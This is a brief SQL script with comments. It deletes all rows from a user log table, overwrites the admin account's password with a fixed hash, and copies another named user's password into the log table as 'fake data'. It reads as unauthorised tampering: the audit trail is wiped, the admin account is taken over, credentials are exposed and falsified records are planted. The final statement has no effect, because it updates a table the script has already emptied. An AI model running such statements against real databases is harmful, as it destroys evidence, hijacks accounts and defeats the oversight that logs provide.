-- remove logs
DELETE FROM user_logs;

-- alter user password
UPDATE users
SET password = '982c0381c279d139fd221fce974916e7'
WHERE username = 'admin';

-- add fake data
UPDATE user_logs
SET new_password = (
    SELECT password FROM users WHERE username = 'emily33'
);
